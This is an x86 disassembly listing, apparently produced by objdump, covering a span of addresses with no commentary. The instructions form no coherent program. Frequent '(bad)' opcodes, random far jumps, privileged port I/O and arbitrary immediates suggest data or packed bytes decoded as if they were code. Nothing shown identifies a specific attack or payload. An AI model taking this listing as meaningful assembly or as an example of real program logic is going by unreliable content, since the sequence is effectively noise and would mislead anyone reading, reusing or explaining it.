  4172d1:	fdivr  QWORD PTR [edi-0x3bc13b9c]
  4172d7:	sbb    bl,BYTE PTR [esi-0x2e7ce8c7]
  4172dd:	jb     0x41729e
  4172df:	test   al,0x42
  4172e1:	jg     0x417317
  4172e3:	jle    0x4172bc
  4172e5:	sub    ah,BYTE PTR [edx-0x66b69db9]
  4172eb:	pop    ds
  4172ec:	push   ebx
  4172ed:	loopne 0x417336
  4172ef:	mov    ch,0xf7
  4172f1:	push   edi
  4172f2:	ins    DWORD PTR es:[edi],dx
  4172f3:	push   edx
  4172f4:	ins    DWORD PTR es:[edi],dx
  4172f5:	test   al,0xe6
  4172f7:	and    eax,0xf15d49e4
  4172fc:	test   al,0x39
  4172fe:	pop    edx
  4172ff:	or     ebp,0x59
  417302:	inc    esp
  417303:	inc    edi
  417304:	and    DWORD PTR [ebp+0x3ca67845],edi
  41730a:	add    al,0x11
  41730c:	pop    ss
  41730d:	xchg   ebx,eax
  41730e:	(bad)
  417313:	test   eax,0x607a9c0f
  417318:	leave  
  417319:	fild   WORD PTR [ebx]
  41731b:	dec    ecx
  41731c:	xor    BYTE PTR [ecx+esi*2],bl
  41731f:	dec    ebp
  417320:	push   0x3f0a8298
  417325:	sbb    DWORD PTR [ebx],0x89293659
  41732b:	mov    ds:0xb5156870,al
  417330:	imul   DWORD PTR [edx-0x2]
  417333:	cmc    
  417334:	jbe    0x41737b
  417336:	shl    DWORD PTR [ebp+0x83f5928],cl
  41733c:	arpl   sp,bx
  41733e:	repz push ecx
  417340:	cmp    ebp,edi
  417342:	mov    cl,0x2f
  417344:	and    ecx,DWORD PTR [ebp+0x7e]
  417347:	and    al,0x66
  417349:	iret   
  41734a:	push   ebx
  41734b:	aaa    
  41734c:	nop
  41734d:	cmp    eax,0xec311919
  417352:	cdq    
  417353:	sahf   
  417354:	mov    edx,0x5fe46a39
  417359:	xchg   edx,eax
  41735a:	jmp    0x47804ee6
  41735f:	std    
  417360:	int3   
  417361:	js     0x41737b
  417363:	pop    eax
  417364:	cmp    DWORD PTR [ecx-0x27],ebx
  417367:	sbb    DWORD PTR [edi+0x6a57d79e],esi
  41736d:	sahf   
  41736e:	add    dl,bh
  417370:	push   edx
  417371:	scas   al,BYTE PTR es:[edi]
  417372:	mov    bh,0xbb
  417374:	xchg   esp,eax
  417375:	imul   eax,eax,0xffffffda
  417378:	jb     0x4173a2
  41737a:	dec    esp
  41737b:	mov    bh,0xad
  41737d:	push   0xffffff8c
  41737f:	clc    
  417380:	cs pop ss
  417382:	push   eax
  417383:	push   ss
  417384:	pop    ebx
  417385:	or     ah,dh
  417387:	add    al,0x63
  417389:	adc    al,0x58
  41738b:	js     0x41739b
  41738d:	mov    al,ds:0xa68ab086
  417392:	jnp    0x417351
  417394:	popf   
  417395:	push   cs
  417396:	js     0x417415
  417398:	mov    ebp,DWORD PTR [esp+0x2770be80]
  41739f:	xchg   ebx,eax
  4173a0:	int3   
  4173a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173a2:	xchg   edx,eax
  4173a3:	fild   QWORD PTR [esi+0x34]
  4173a6:	test   ch,al
  4173a8:	cld    
  4173a9:	call   0x20316923
  4173ae:	sub    DWORD PTR [eax+0x26],ebx
  4173b1:	sbb    dl,BYTE PTR [eax+esi*4-0x5b]
  4173b5:	xchg   ecx,eax
  4173b6:	bound  ebx,QWORD PTR [edi-0x32]
  4173b9:	div    ecx
  4173bb:	xchg   edx,eax
  4173bc:	mov    ch,0xc5
  4173be:	xor    ebp,DWORD PTR [ebx]
  4173c0:	mov    edi,0xb526aaf
  4173c5:	test   eax,0x140ab59b
  4173ca:	adc    DWORD PTR [edx-0xf3316e4],esi
  4173d0:	or     al,0x93
  4173d2:	out    dx,eax
  4173d3:	push   ss
  4173d4:	pop    edx
  4173d5:	xor    al,0x79
  4173d7:	xchg   ebx,eax
  4173d8:	sbb    al,0xbe
  4173da:	mov    DWORD PTR [ebp-0xb765e20],esi
  4173e0:	ret    0x9013
  4173e3:	mov    bl,0xd1
  4173e5:	aas    
  4173e6:	dec    DWORD PTR [ebx-0x15]
  4173e9:	jns    0x4173cd
  4173eb:	mov    bl,0x88
  4173ed:	cli    
  4173ee:	enter  0x6463,0x48
  4173f2:	shl    BYTE PTR [ecx-0x1e01997c],cl
  4173f8:	jg     0x4173ee
  4173fa:	loop   0x417384
  4173fc:	shl    edx,0xfb
  4173ff:	pop    ss
  417400:	jle    0x41744a
  417402:	lock mov eax,0x6d3851e0
  417408:	adc    dh,BYTE PTR [esi+0x35365d61]
  41740e:	nop
  41740f:	jb     0x41744c
  417411:	and    BYTE PTR [ecx-0x4875c6f4],dl
  417417:	jo     0x4173ab
  417419:	push   edi
  41741a:	mov    cs,WORD PTR [edx]
  41741c:	aad    0xd0
  41741e:	mov    bl,0x6c
  417420:	retf   
  417421:	dec    ebp
  417422:	mov    bh,0x1e
  417424:	mov    eax,0xfa236eeb
  417429:	xchg   edi,eax
  41742a:	gs cmc 
  41742c:	mov    ebp,0xcec153e9
  417431:	out    dx,eax
  417432:	mov    ss,WORD PTR [edi-0x29c87dde]
  417438:	push   0x53
  41743a:	and    eax,0x78989348
  41743f:	imul   edi,edi,0x71
  417442:	xchg   edi,eax
  417443:	or     al,0x1e
  417445:	ds stos BYTE PTR es:[edi],al
  417447:	aam    0x29
  417449:	xor    ebx,ebp
  41744b:	xchg   esp,eax
  41744c:	imul   eax,DWORD PTR [eax-0x161547e9],0x41ef2ef4
  417456:	sub    BYTE PTR [ecx-0x24a00875],ah
  41745c:	and    eax,0x615ed494
  417461:	mov    eax,DWORD PTR [esi]
  417463:	fidivr DWORD PTR [ebp-0x43e9c019]
  417469:	adc    edx,edx
  41746b:	or     al,0xc5
  41746d:	xchg   edx,eax
  41746e:	inc    ebx
  41746f:	adc    ch,bl
  417471:	es push esp
  417473:	xchg   ebx,eax
  417474:	in     eax,dx
  417475:	lods   al,BYTE PTR ds:[esi]
  417476:	pop    esp
  417477:	and    eax,0x9f0c08d6
  41747c:	mov    al,ds:0xc21e9c71
  417481:	mov    ebp,0xca206857
  417486:	jbe    0x4174cf
  417488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417489:	sbb    al,0x36
  41748b:	dec    ecx
  41748c:	retf   0xa3ce
  41748f:	shl    cl,0x2b
  417492:	popw   es
  417494:	mov    WORD PTR [edx+0x5fa83f5d],ss
  41749a:	call   0xb0cf72fd
  41749f:	dec    ebx
  4174a0:	dec    ebp
  4174a1:	scas   eax,DWORD PTR es:[edi]
  4174a2:	xchg   ecx,eax
  4174a3:	fcomp  st(4)
  4174a5:	jg     0x41748b
  4174a7:	ins    DWORD PTR es:[edi],dx
  4174a8:	jg     0x41748f
  4174aa:	fild   DWORD PTR [ebx+0x5a1ed03e]
  4174b0:	(bad)  
  4174b1:	mov    ebx,0x39d0ec96
  4174b6:	pop    ecx
  4174b7:	pushf  
  4174b8:	ins    DWORD PTR es:[edi],dx
  4174b9:	scas   al,BYTE PTR es:[edi]
  4174ba:	cmp    DWORD PTR [edx-0x623096e],ebp
  4174c0:	cmp    ecx,DWORD PTR [edx-0x7e]
  4174c3:	cwde   
  4174c4:	sar    DWORD PTR [ecx-0x5f1d0eb6],1
  4174ca:	jecxz  0x4174b7
  4174cc:	pop    esi
  4174cd:	jmp    0x41749e
  4174cf:	lock out 0x8,eax
  4174d2:	push   esi
  4174d3:	sbb    DWORD PTR [ecx],0x25
  4174d6:	cli    
  4174d7:	sub    al,0x9b
  4174d9:	cmp    edx,ebp
  4174db:	les    eax,FWORD PTR [esi+0x439d2a9d]
  4174e1:	gs mov eax,0x4e1ff720
  4174e7:	test   eax,0x6d997965
  4174ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174ed:	mov    ebx,0x351166d0
  4174f2:	mov    cl,0xd0
  4174f4:	shl    BYTE PTR [ecx-0x1b],1
  4174f7:	repz ds lahf 
  4174fa:	mov    ds:0x26c6684a,al
  4174ff:	fist   WORD PTR [ebp-0x7e]
  417502:	outs   dx,BYTE PTR ds:[esi]
  417503:	push   0xffffff86
  417505:	sbb    DWORD PTR [edx-0x20],edi
  417508:	jne    0x41754a
  41750a:	sub    al,BYTE PTR [eax-0x78]
  41750d:	sbb    DWORD PTR [eax],0x24
  417510:	mov    esp,0x58d1db3b
  417515:	je     0x41758b
  417517:	cli    
  417518:	cmp    dh,dh
  41751a:	out    0x94,al
  41751c:	cmc    
  41751d:	dec    ecx
  41751e:	add    BYTE PTR [edx-0x53e05f6e],cl
  417524:	sahf   
  417525:	rcr    BYTE PTR [edi-0x730a8fbb],0xed
  41752c:	mov    edi,0x1cc4fe14
  417531:	(bad)  
  417533:	and    dl,dh
  417535:	pushf  
  417536:	outs   dx,DWORD PTR ds:[esi]
  417537:	cs sbb ch,ah
  41753a:	mov    ds:0x7a3ca68,eax
  41753f:	dec    edx
  417540:	imul   edi,DWORD PTR [ecx],0xe145bfdd
  417546:	sub    ah,dl
  417548:	dec    ebx
  417549:	sti    
  41754a:	add    sp,WORD PTR [edi]
  41754d:	loopne 0x4174f5
  41754f:	not    BYTE PTR [edx-0x9]
  417552:	jecxz  0x4175aa
  417554:	iret   
  417555:	jmp    0x6d51:0x887f9e6a
  41755c:	dec    esp
  41755d:	(bad)  
  41755e:	mov    ebx,0x4aa7c42
  417563:	out    0xd9,eax
  417565:	fnsave [esi]
  417567:	adc    DWORD PTR [edx-0x11],esp
  41756a:	mov    cl,0x7d
  41756c:	add    esp,DWORD PTR [ebx-0x4c]
  41756f:	ja     0x417571
  417571:	fiadd  DWORD PTR [edx-0x554c058d]
  417577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417578:	dec    edx
  417579:	iret   
  41757a:	int3   
  41757b:	mov    ebp,0xe4709aed
  417580:	enter  0x1107,0xe1
  417584:	xchg   DWORD PTR [edi+0x1f],esi
  417587:	push   ebx
  417588:	pop    ss
  417589:	cld    
  41758a:	or     ecx,esi
  41758c:	pop    edi
  41758d:	scas   al,BYTE PTR es:[edi]
  41758e:	bound  eax,QWORD PTR [esi+ebp*8]
  417591:	jbe    0x41756d
  417593:	push   es
  417594:	shr    esi,0x45
  417597:	or     BYTE PTR [ecx-0x3e16d5ce],al
  41759d:	fldenv [edx-0x1663e7c8]
  4175a3:	or     al,0x40
  4175a5:	xchg   DWORD PTR [ecx],ebx
  4175a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a8:	mov    bh,0xfb
  4175aa:	mov    eax,ds:0xdb55768d
  4175af:	jl     0x417605
  4175b1:	lahf   
  4175b2:	fwait
  4175b3:	push   ecx
  4175b4:	(bad)  [ebx+edi*2-0x6]
  4175b8:	pushf  
  4175b9:	push   0x37
  4175bb:	mov    eax,ds:0xaaa01dc6
  4175c0:	rol    edx,1
  4175c2:	mov    DWORD PTR [ebp+0x1faa02ad],esi
  4175c8:	inc    ebx
  4175c9:	adc    eax,0x39f1a606
  4175ce:	mov    bh,bh
  4175d0:	std    
  4175d1:	mov    bh,0x8c
  4175d3:	(bad)  
  4175d4:	call   0x2ae6464f
  4175d9:	xchg   DWORD PTR ds:0x4fa5bbf5,ebx
  4175df:	add    ah,BYTE PTR ds:0x5e63b7ea
  4175e5:	mov    ah,0xbd
  4175e7:	stc    
  4175e8:	popf   
  4175e9:	fwait
  4175ea:	sub    eax,0x391f9ffd
  4175ef:	pushf  
  4175f0:	pop    ss
  4175f1:	jnp    0x4175a3
  4175f3:	sbb    al,0xff
  4175f5:	add    eax,0xbed8ad4f
  4175fa:	adc    esp,DWORD PTR [esi-0x5f73c432]
  417600:	js     0x417605
  417602:	loopne 0x41758b
  417604:	scas   eax,DWORD PTR es:[edi]
  417605:	fs aam 0xcc
  417608:	push   esi
  417609:	xor    DWORD PTR [eax+0x3],eax
  41760c:	inc    edx
  41760d:	xor    esi,DWORD PTR [eax+0x1a11486f]
  417613:	stos   BYTE PTR es:[edi],al
  417614:	in     al,dx
  417615:	cli    
  417616:	lea    eax,[esi]
  417618:	jns    0x41760e
  41761a:	loop   0x4175b6
  41761c:	adc    bh,BYTE PTR [eax-0x34ef793f]
  417622:	and    eax,0x7c0ff9a5
  417627:	lods   al,BYTE PTR ds:[esi]
  417628:	xor    BYTE PTR [ebp-0x76c2c13a],0xe6
  41762f:	je     0x417602
  417631:	(bad)  
  417633:	pop    ds
  417634:	adc    esp,DWORD PTR [edx]
  417636:	mov    cl,bl
  417638:	int3   
  417639:	(bad)  
  41763a:	sub    eax,0xc46a8f8a
  41763f:	xor    ebp,ebp
  417641:	aas    
  417642:	sbb    al,0xa7
  417644:	les    ebp,FWORD PTR [ecx+eiz*2+0x1b]
  417648:	inc    ebp
  417649:	fwait
  41764a:	xor    ah,0x91
  41764d:	ds ins DWORD PTR es:[edi],dx
  41764f:	and    ch,dl
  417651:	pushf  
  417652:	and    DWORD PTR [edi+0x55],esi
  417655:	xchg   ebp,eax
  417656:	push   ds
  417657:	jmp    0x4176d1
  417659:	cdq    
  41765a:	(bad)  
  41765b:	fucomi st,st(6)
  41765d:	out    0x48,al
  41765f:	nop
  417660:	mov    ax,0x32a4
  417664:	dec    edi
  417665:	fadd   DWORD PTR [ebx]
  417667:	jle    0x732a8541
  41766d:	cmp    BYTE PTR [edi+0x1e],bh
  417670:	xchg   BYTE PTR fs:[ecx-0x43799b28],dl
  417677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417678:	mov    ebx,0x6b623121
  41767d:	inc    eax
  41767e:	mov    ds:0xf2ce8ec9,eax
  417683:	pop    ebp
  417684:	or     ebx,ebx
  417686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417687:	mov    al,ds:0xedc85f8b
  41768c:	add    al,0x68
  41768e:	pavgb  mm1,QWORD PTR [edi]
  417691:	icebp  
  417692:	jnp    0x417622
  417694:	mov    es,WORD PTR [edx]
  417696:	or     eax,0x325e6aad
  41769b:	adc    al,0x89
  41769d:	test   al,0xa0
  41769f:	add    esi,eax
  4176a1:	ret    
  4176a2:	int    0x3e
  4176a4:	cmc    
  4176a5:	lds    ecx,FWORD PTR [esi+esi*1]
  4176a8:	out    dx,eax
  4176a9:	inc    esi
  4176aa:	shr    DWORD PTR [edi],1
  4176ac:	repnz popa 
  4176ae:	add    esi,DWORD PTR [edx+0x48]
  4176b1:	add    dl,ch
  4176b3:	jmp    0xba89:0xb02a3bfe
  4176ba:	xchg   edx,eax
  4176bb:	xor    eax,0x8bdf80ec
  4176c0:	es and eax,0x12da6e7e
  4176c6:	popf   
  4176c7:	adc    al,0x39
  4176c9:	ror    ch,cl
  4176cb:	mov    WORD PTR [ebp-0x80],?
  4176ce:	jge    0x41773e
  4176d0:	je     0x4176e8
  4176d2:	adc    BYTE PTR [ebp+0x17a1e8de],dl
  4176d8:	imul   edi,DWORD PTR [edx+0x44],0x48a6a4f6
  4176df:	mov    esi,0xd40ec72
  4176e4:	push   0x317bec54
  4176e9:	icebp  
  4176ea:	loop   0x41770e
  4176ec:	and    cl,0xe1
  4176ef:	outs   dx,BYTE PTR ds:[esi]
  4176f0:	mov    cl,0x3
  4176f2:	add    al,0x19
  4176f4:	adc    DWORD PTR [eax],ebx
  4176f6:	scas   al,BYTE PTR es:[edi]
  4176f7:	mov    ?,WORD PTR [edx]
  4176f9:	stos   BYTE PTR es:[edi],al
  4176fa:	mov    dl,0x84
  4176fc:	arpl   WORD PTR [ecx],cx
  4176fe:	jo     0x4176fc
  417700:	mov    ecx,0xe03e62ad
  417705:	gs dec esi
  417707:	lds    edi,FWORD PTR [edx+0x6b]
  41770a:	push   edi
  41770b:	inc    ebp
  41770c:	dec    ebx
  41770d:	xchg   edx,eax
  41770e:	add    esi,eax
  417710:	retf   0x2b5a
  417713:	repz fiadd DWORD PTR [esi-0x67]
  417717:	and    BYTE PTR [esp+eax*1],0x43
  41771b:	lds    esp,FWORD PTR [ebx+0x4cddc8e4]
  417721:	cmp    DWORD PTR [ebx],esp
  417723:	sar    ebx,1
  417725:	mov    DWORD PTR [eax],ebp
  417727:	mov    al,ds:0x352dbe16
  41772c:	xchg   esi,eax
  41772d:	add    DWORD PTR [ebp-0xc47f3e5],esp
  417733:	adc    ebx,DWORD PTR [eax]
  417735:	int    0xc
  417737:	push   eax
  417738:	aam    0x5f
  41773a:	push   esp
  41773b:	jmp    0x15e89a8f
  417740:	(bad)  
  417741:	add    al,0x9e
  417743:	inc    ebp
  417744:	aad    0x39
  417746:	mov    al,0xcf
  417748:	push   ds
  417749:	mov    BYTE PTR [ecx],bh
  41774b:	data16 into 
  41774d:	imul   ebx,eax,0x1ac9fcb2
  417753:	fisttp WORD PTR [ebx]
  417755:	das    
  417756:	rcr    BYTE PTR [esi],0xf0
  417759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775a:	fmul   DWORD PTR [esi]
  41775c:	xchg   ebx,eax
  41775d:	mov    eax,ds:0x8277feb4
  417762:	jbe    0x41770a
  417764:	mov    dh,BYTE PTR [esi+0x32]
  417767:	mov    al,ds:0x6f5d472b
  41776c:	addr16 dec ebx
  41776e:	xchg   esi,eax
  41776f:	xchg   DWORD PTR [edx],edi
  417771:	aam    0x39
  417773:	hlt    
  417774:	adc    al,dh
  417776:	dec    esi
  417777:	aad    0xdb
  417779:	xor    bh,BYTE PTR [esi*8-0x5c071b9a]
  417780:	ins    DWORD PTR es:[edi],dx
  417781:	pusha  
  417782:	inc    esp
  417783:	ret    
  417784:	fwait
  417785:	sub    ebx,0x2e3acab5
  41778b:	loop   0x4177ea
  41778d:	mov    dh,0xa8
  41778f:	pop    ds
  417790:	rol    DWORD PTR [edx],cl
  417792:	enter  0x8e78,0xef
  417796:	lahf   
  417797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417798:	jo     0x41778d
  41779a:	lods   eax,DWORD PTR ds:[esi]
  41779b:	xchg   BYTE PTR [ebx],ah
  41779d:	pop    edx
  41779e:	cld    
  41779f:	jmp    FWORD PTR [ecx+0x25]
  4177a2:	mov    eax,ds:0x43d4f1c3
  4177a7:	int3   
  4177a8:	inc    eax
  4177a9:	sub    DWORD PTR [ebp-0x54221f2e],0x706dc1a6
  4177b3:	not    BYTE PTR [esi]
  4177b5:	scas   eax,DWORD PTR es:[edi]
  4177b6:	or     al,0x98
  4177b8:	jnp    0x45c156ee
  4177be:	call   0x7eeae233
  4177c3:	add    BYTE PTR [ebx-0x7ec12d1c],0xff
  4177ca:	adc    esi,0x721e3942
  4177d0:	and    eax,0x3e49c495
  4177d5:	inc    edx
  4177d6:	inc    edi
  4177d7:	sbb    eax,0x9665eff4
  4177dc:	test   BYTE PTR [edx],ch
  4177de:	jge    0x4177f3
  4177e0:	pop    ecx
  4177e1:	mov    ah,0x89
  4177e3:	sbb    BYTE PTR [edi-0x333de809],dh
  4177e9:	sub    eax,0x481d9c49
  4177ee:	lahf   
  4177ef:	mov    DWORD PTR [edx],0x85bcf0d6
  4177f5:	ss out 0x2c,al
  4177f8:	fnstsw WORD PTR [bp+si-0x63]
  4177fc:	(bad)  
  4177fd:	sbb    al,0x60
  4177ff:	into   
  417800:	stos   DWORD PTR es:[edi],eax
  417801:	push   eax
  417802:	xchg   DWORD PTR [eax],edx
  417804:	bound  eax,QWORD PTR ds:0x8f08e013
  41780a:	cld    
  41780b:	retf   
  41780c:	pusha  
  41780d:	add    dh,cl
  41780f:	pop    eax
  417810:	test   BYTE PTR [edi+0x53],0x72
  417814:	loope  0x417889
  417816:	sub    al,0xb4
  417818:	xchg   BYTE PTR [edx],ah
  41781a:	jmp    FWORD PTR [esi]
  41781c:	xor    BYTE PTR [edi],dh
  41781e:	lea    ebp,[edx+eax*2+0x69]
  417822:	push   ebx
  417823:	pop    esp
  417824:	call   0x7b12:0x2829f5f5
  41782b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41782c:	lock pushf 
  41782e:	int3   
  41782f:	cmc    
  417830:	int3   
  417831:	bound  esp,QWORD PTR [ebp+0x64464495]
  417837:	mov    bl,0x62
  417839:	or     al,BYTE PTR [ebp-0x52357613]
  41783f:	call   0xab2b:0xf5011ca1
  417846:	and    eax,0xe2f0b43
  41784b:	div    ebp
  41784d:	pop    es
  41784e:	push   edi
  41784f:	cld    
  417850:	(bad)  
  417851:	shl    edx,0x7b
  417854:	addr16 ds mov ebp,0xd66978c3
  41785b:	lock xor eax,0xd50b5e1d
  417861:	pop    esi
  417862:	inc    esp
  417863:	(bad)  
  417864:	pop    ss
  417865:	shr    BYTE PTR [ecx-0x9],1
  417868:	inc    ebp
  417869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41786a:	adc    edx,DWORD PTR [esi+0x386b39ac]
  417870:	sbb    al,0xba
  417872:	jg     0x4178b6
  417874:	ror    DWORD PTR [esi+0x75],1
  417877:	les    esp,FWORD PTR [ebp-0x6a]
  41787a:	addr16 jo 0x4178de
  41787d:	fnop   
  41787f:	dec    edi
  417880:	cmp    DWORD PTR [ebp+0x782ec586],esi
  417886:	xor    DWORD PTR [eax+0x697c8955],0xffffffb6
  41788d:	pop    eax
  41788e:	fdivr  DWORD PTR [ebx+0x578bb8da]
  417894:	stos   BYTE PTR es:[edi],al
  417895:	mov    al,ds:0x1bff9452
  41789a:	jmp    0x9e43:0x4bebdf7b
  4178a1:	sbb    al,0x5c
  4178a3:	repz jle 0x417843
  4178a6:	ins    BYTE PTR es:[edi],dx
  4178a7:	push   ds
  4178a8:	pop    ecx
  4178a9:	cwde   
  4178aa:	loopne 0x4178e5
  4178ac:	iret   
  4178ad:	out    0x15,eax
  4178af:	fldenv [ebx-0x7e7078e8]
  4178b5:	jbe    0x4178aa
  4178b7:	mov    es,WORD PTR [ebx+0x4f]
  4178ba:	les    ecx,FWORD PTR [edi-0x140d2534]
  4178c0:	jge    0x417866
  4178c2:	xchg   ebp,eax
  4178c3:	xchg   ebx,eax
  4178c4:	xor    DWORD PTR [ecx+edi*8-0x2d],edi
  4178c8:	jle    0x4178ad
  4178ca:	es (bad) 
  4178cc:	xlat   BYTE PTR ds:[ebx]
  4178cd:	add    dl,BYTE PTR [esi]
  4178cf:	lds    edx,FWORD PTR ds:0x5c29311d
  4178d5:	mov    cl,0x8b
  4178d7:	mov    esp,0x2189db40
  4178dc:	lea    ecx,[edx]
  4178de:	lahf   
  4178df:	cmp    ebp,DWORD PTR [ebx]
  4178e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e2:	jp     0x417867
  4178e4:	fist   DWORD PTR [ebp-0x5a]
  4178e7:	arpl   WORD PTR [esi-0x4db68410],si
  4178ed:	add    DWORD PTR [ecx-0x80],esp
  4178f0:	mov    eax,ds:0x6bd18e7c
  4178f5:	or     al,0x8b
  4178f7:	pop    edx
  4178f8:	loope  0x417946
  4178fa:	or     bh,cl
  4178fc:	cmp    BYTE PTR [edx],bl
  4178fe:	sar    BYTE PTR [esi+0x26f5e410],cl
  417904:	lods   al,BYTE PTR ds:[esi]
  417905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417906:	and    eax,0x67132f5
  41790b:	mov    ds:0x9e3b16ab,al
  417910:	sub    eax,0x925a4150
  417915:	fld    st(1)
  417917:	fisubr DWORD PTR [edi+0x17]
  41791a:	and    DWORD PTR [ebp+0x5b],edx
  41791d:	hlt    
  41791e:	adc    BYTE PTR [eax+0x37abcdc4],ah
  417924:	iret   
  417925:	leave  
  417926:	fdivr  st(4),st
  417928:	cmp    DWORD PTR [edi-0x2e],ecx
  41792b:	xchg   esp,eax
  41792c:	inc    edi
  41792d:	pop    eax
  41792e:	cld    
  41792f:	(bad)  
  417930:	pop    ebx
  417931:	arpl   WORD PTR [eax+edx*1-0x5a2d08e8],di
  417938:	push   edi
  417939:	jnp    0x41793c
  41793b:	lods   al,BYTE PTR ds:[esi]
  41793c:	pusha  
  41793d:	mov    eax,0x67dff108
  417942:	sub    DWORD PTR [ecx-0x5c85a697],edx
  417948:	xchg   edx,eax
  417949:	add    eax,0xb2fe5b19
  41794e:	mov    cs,eax
  417950:	nop
  417951:	(bad)
  417955:	or     edx,DWORD PTR cs:[esi]
  417958:	mov    ?,WORD PTR [eax-0x7cfc343b]
  41795e:	imul   esp,ecx,0x1235e879
  417964:	repnz xlat BYTE PTR ds:[ebx]
  417966:	jne    0x417964
  417968:	pushf  
  417969:	pop    edi
  41796a:	push   ds
  41796b:	fld    TBYTE PTR [esi]
  41796d:	mov    al,ds:0x6b3776ae
  417972:	rcl    DWORD PTR [ebp-0xab7dde7],1
  417978:	dec    ecx
  417979:	inc    ecx
  41797a:	rcr    DWORD PTR [ebx],0x90
  41797d:	push   0xffffffa8
  41797f:	push   0xffffff9e
  417981:	inc    esp
  417982:	sub    al,0xd9
  417984:	lahf   
  417985:	retf   
  417986:	mov    al,ds:0xa52a59fd
  41798b:	xor    al,0xdd
  41798d:	jb     0x41793a
  41798f:	jl     0x4179c0
  417991:	iret   
  417992:	adc    esi,DWORD PTR [eax-0x8]
  417995:	fcomp  DWORD PTR [ebx]
  417997:	loopne 0x417a0e
  417999:	jnp    0x417926
  41799b:	in     al,dx
  41799c:	cmc    
  41799d:	inc    esp
  41799e:	leave  
  41799f:	sbb    bl,0xbe
  4179a2:	ret    0xd039
  4179a5:	mov    al,ds:0xa9566f71
  4179aa:	or     al,BYTE PTR [ebp+0x74]
  4179ad:	int3   
  4179ae:	dec    edi
  4179af:	mov    DWORD PTR [edx+ecx*8+0x54db4b],esi
  4179b6:	mov    ebx,0xdc0cd439
  4179bb:	retf   0xb41b
  4179be:	popf   
  4179bf:	ins    DWORD PTR es:[edi],dx
  4179c0:	dec    ecx
  4179c1:	sbb    al,0x33
  4179c3:	fidiv  WORD PTR [edi-0x165f94f9]
  4179c9:	les    eax,FWORD PTR [ebx-0xde86dfb]
  4179cf:	inc    eax
  4179d0:	dec    esi
  4179d1:	fwait
  4179d2:	dec    ebp
  4179d3:	mov    ebx,0x9745f791
  4179d8:	mov    eax,ds:0x49ae8275
  4179dd:	sahf   
  4179de:	enter  0x609d,0x53
  4179e2:	or     dl,ch
  4179e4:	sti    
  4179e5:	inc    sp
  4179e7:	aad    0x51
  4179e9:	adc    eax,edx
  4179eb:	std    
  4179ec:	pop    edx
  4179ed:	fbstp  TBYTE PTR [edx]
  4179ef:	not    DWORD PTR [edx]
  4179f1:	rol    BYTE PTR [edi+0x78],0x55
  4179f5:	adc    DWORD PTR [ecx+0x71],edx
  4179f8:	add    eax,0x192a66bb
  4179fd:	dec    ecx
  4179fe:	mov    eax,0x90124dcc
  417a03:	inc    edi
  417a04:	retf   0x90a7
  417a07:	stos   BYTE PTR es:[edi],al
  417a08:	xor    eax,esi
  417a0a:	xchg   esi,eax
  417a0b:	adc    BYTE PTR [esi+eiz*8-0x36],0xa4
  417a10:	leave  
  417a11:	inc    edx
  417a12:	call   esi
  417a14:	not    edx
  417a16:	push   eax
  417a17:	(bad)  
  417a18:	jmp    0x3e77:0xb2e9ccf9
  417a1f:	inc    ebx
  417a20:	in     eax,0x51
  417a22:	adc    DWORD PTR [ebx+0x25],0x7d
  417a26:	std    
  417a27:	daa    
  417a28:	fs and eax,0x7cea0b37
  417a2e:	jbe    0x417a59
  417a30:	push   cs
  417a31:	cmp    eax,0x4738ff51
  417a36:	inc    ecx
  417a37:	mov    esp,0x73fa64c6
  417a3c:	js     0x417a6b
  417a3e:	mov    ds:0xca272ece,eax
  417a43:	push   ebx
  417a44:	mov    edi,0xd25631d3
  417a49:	push   edi
  417a4a:	mov    eax,0x1c2b4a26
  417a4f:	je     0x417a77
  417a51:	adc    al,0x21
  417a53:	pushf  
  417a54:	pop    eax
  417a55:	dec    edi
  417a56:	inc    edx
  417a57:	ja     0x417aa7
  417a59:	test   eax,0x80f45cac
  417a5e:	fnstcw WORD PTR [ebp+0x596ec604]
  417a64:	(bad)  
  417a65:	push   edi
  417a66:	in     al,0x2
  417a68:	sub    edi,ebp
  417a6a:	mov    ch,0x1c
  417a6c:	ja     0x417a87
  417a6e:	push   ecx
  417a6f:	pop    es
  417a70:	and    edi,DWORD PTR [ecx-0xd]
  417a73:	cmp    eax,0x835b41a3
  417a78:	test   DWORD PTR [ebp-0x21],0xb3247ddf
  417a7f:	adc    al,0x84
  417a81:	cmp    bl,BYTE PTR [ebp+0x77d6c375]
  417a87:	popa   
  417a88:	xor    ebp,DWORD PTR [ecx-0xe]
  417a8b:	ror    DWORD PTR [ebx-0x13b0dc9d],1
  417a91:	stos   BYTE PTR es:[edi],al
  417a92:	sbb    BYTE PTR [ecx+0x67],ch
  417a95:	adc    DWORD PTR [ecx],ebp
  417a97:	daa    
  417a98:	jecxz  0x417ad5
  417a9a:	and    DWORD PTR [ebx],ebp
  417a9c:	xlat   BYTE PTR ds:[ebx]
  417a9d:	loop   0x417aa9
  417a9f:	mov    eax,ds:0x6f72f2c2
  417aa4:	retf   0x18ae
  417aa7:	jg     0x417a6d
  417aa9:	push   ebx
  417aaa:	scas   eax,DWORD PTR es:[edi]
  417aab:	mov    bl,0x2
  417aad:	out    dx,eax
  417aae:	sub    ah,BYTE PTR [ecx-0xd]
  417ab1:	push   0xb07ae2d4
  417ab6:	xor    BYTE PTR [ecx+0x69],cl
  417ab9:	(bad)  
  417aba:	jle    0x417b09
  417abc:	and    BYTE PTR [eax],cl
  417abe:	mov    ch,0x50
  417ac0:	fcmovnb st,st(7)
  417ac2:	popa   
  417ac3:	cmc    
  417ac4:	cs mov bh,0xf7
  417ac7:	and    al,0xba
  417ac9:	arpl   ax,bp
  417acb:	jmp    0xe58b88a5
  417ad0:	rcl    BYTE PTR [eax+0x7bac7726],0xa9
  417ad7:	fisttp WORD PTR [esi]
